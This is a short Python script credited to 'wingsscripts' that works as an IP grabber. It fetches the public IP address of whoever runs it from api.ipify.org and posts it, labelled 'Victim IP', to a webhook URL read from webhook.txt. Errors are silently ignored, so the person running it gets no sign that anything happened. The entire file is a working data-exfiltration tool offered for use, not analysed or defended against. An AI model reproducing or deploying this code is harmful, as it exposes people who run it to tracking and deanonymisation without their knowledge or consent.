# Author: wingsscripts
version = "1.0.4"

import requests

# Grabbing IP
def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org", timeout=5)
        return response.text
    except requests.RequestException:
        return "Error (cant get IP)"

# WEBHOOK
try:
    with open("webhook.txt", "r") as f:
        webhook = f.read().strip()
except FileNotFoundError:
    webhook = None

if webhook:
    IP = get_public_ip()
    payload = {
        "content": f"Victim IP: `{IP}`"
    }
    try:
        response = requests.post(webhook, json=payload, timeout=5)
        response.raise_for_status()
    except requests.RequestException:
        pass
else:
    pass